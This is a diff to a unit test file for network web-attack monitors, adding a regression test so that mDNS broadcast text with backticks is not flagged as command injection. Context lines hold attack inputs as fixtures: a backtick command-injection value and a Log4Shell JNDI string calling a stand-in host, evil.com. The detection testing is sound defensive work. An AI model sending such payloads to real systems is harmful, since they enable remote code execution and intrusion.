@@ -204,6 +204,20 @@ class TestWebAttackMonitors(unittest.TestCase):
     def test_command_injection_backticks(self):
         self.assertIn("command-injection", self._tags("name=`whoami`"))
 
+    def test_command_injection_ignores_non_tcp_traffic(self):
+        # Regression: an Android device's mDNS service-discovery text
+        # ("`_androidtvremote2._tcp` ...") was observed on live traffic
+        # matching the backtick alternative of this regex - ordinary UDP
+        # broadcast chatter, nothing to do with command injection.
+        packet = _packet(
+            proto="mdns",
+            transport="udp",
+            payload_text="`_androidtvremote2._tcp`local",
+            summary="mDNS message",
+        )
+        tags = {hit["tag"] for hit in evaluate_packet(packet, self.monitors)}
+        self.assertNotIn("command-injection", tags)
+
     def test_log4shell_jndi_ldap(self):
         self.assertIn("log4shell", self._tags("User-Agent: ${jndi:ldap://evil.com/a}"))
 
